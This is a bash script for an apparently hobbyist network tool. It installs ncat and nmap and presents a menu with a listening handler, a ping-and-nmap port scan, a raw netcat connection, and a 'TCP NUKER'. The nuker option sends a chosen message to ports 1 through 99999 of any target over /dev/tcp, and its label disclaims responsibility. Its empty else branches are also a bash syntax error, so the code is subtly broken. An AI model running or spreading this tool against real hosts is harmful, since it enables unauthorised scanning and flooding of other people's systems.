#!/bin/bash

source @imports/import1.sh
source @imports/packet-finder.sh




name="ncat"

if command -v $name &>/dev/null;
then
  printf "Checking for requirement ($name)..."
  sleep 1
  grn
  printf "$good\n"
  reset

else
  printf "Checking for requirement ($name)..."
  sleep 1
  red
  printf "$bad\n"
  reset
  ncat="false"
fi

name="nmap"
if command -v $name &>/dev/null;
then
  printf "Checking for requirement ($name)..."
  sleep 1
  grn
  printf "$good\n"
  reset

else
  printf "Checking for requirement ($name)..."
  sleep 1
  red
  printf "$bad\n"
  reset
  nmap="false"
fi

name="ping"
if command -v $name &>/dev/null;
then
  printf "Checking for requirement ($name)..."
  sleep 1
  grn
  printf "$good\n"
  reset

else
  printf "Checking for requirement ($name)..."
  sleep 1
  red
  printf "$bad\n"
  reset
  ping="false"
fi

if [ $ncat == "false" ]; then printf "Installing (ncat)..."
install ncat >/dev/null
grn
printf "$good\n\n"
reset
else
  #DO FUCKING NOTHING LOL
fi

if [ $nmap == "false" ]; then printf "Installing (nmap)..."
install nmap >/dev/null
grn
printf "$good\n\n"
reset
else
  #DO FUCKING NOTHING LOL
fi

if [ $ping == "false" ]; then printf "Installing (iputils-ping)..."
install iputils-ping >/dev/null
grn
printf "$good\n\n"
reset
else
  #DO FUCKING NOTHING LOL
fi
while :
do
red
printf "\n
##::::'##::::'###::::'##::: ##:'########::'##:::::::'########:'########::
 ##:::: ##:::'## ##::: ###:: ##: ##.... ##: ##::::::: ##.....:: ##.... ##:
 ##:::: ##::'##:. ##:: ####: ##: ##:::: ##: ##::::::: ##::::::: ##:::: ##:
 #########:'##:::. ##: ## ## ##: ##:::: ##: ##::::::: ######::: ########::
 ##.... ##: #########: ##. ####: ##:::: ##: ##::::::: ##...:::: ##.. ##:::
 ##:::: ##: ##.... ##: ##:. ###: ##:::: ##: ##::::::: ##::::::: ##::. ##::
 ##:::: ##: ##:::: ##: ##::. ##: ########:: ########: ########: ##:::. ##:
..:::::..::..:::::..::..::::..::........:::........::........::..:::::..::\n\n"
reset
cyn
printf "
1) Normal TCP handler
2) Scan for open Ports
3) Connect to TCP port
4) TCP NUKER (Not responsible)
5) Exit
\n"
reset

printf "Handler: "
read handler

if [[ -z "$handler" ]];
then
clear
grn
printf "$star please enter a option\n"
reset

else
case $handler in 
  1) printf "Port: "
  read Port
  printf "\n<===[CONSOLE]===>\n\n"
  ncat -lkvp $Port
  ;;
  2)
  printf "Target: "
  read Target
  printf "\n<===[CONSOLE]===>\n\n"
  mag
  printf "\n<===[PING]===>\n\n"
  ping -c 15 $Target
  printf "\n<===[NMAP]===>\n\n"
  nmap $Target | tail -n +5 | head -n -3 
  printf "\n<===[END]===>\n\n"
  reset
  pause
  
  ;;
  3)
  printf "Target: "
  read Target
  printf "Port: "
  read Port
  echo "Connecting..."
  echo "IP: $Target"
  echo "PORT: $Port"
  nc $Target $Port
  ;;
  4)
  printf "TCP NUKER (Because why not :3 )\n"
  printf "Target: "
  read Target
  printf "Message_to_nuke_with: "
  read nuke

   printf "\n<===[TCP_PORT_NUKER]===>\n\n"
  red 
  echo "This will nuke the device (1-99999) scan"
  reset
  date=$(date)
  for i in {1..99999}
  do
  echo "$nuke" &>/dev/tcp/$Target/$i 
  done
  pause
  clear
  ;;
  5)
  echo "$star Exit"
  exit
  ;;
esac

fi 

done
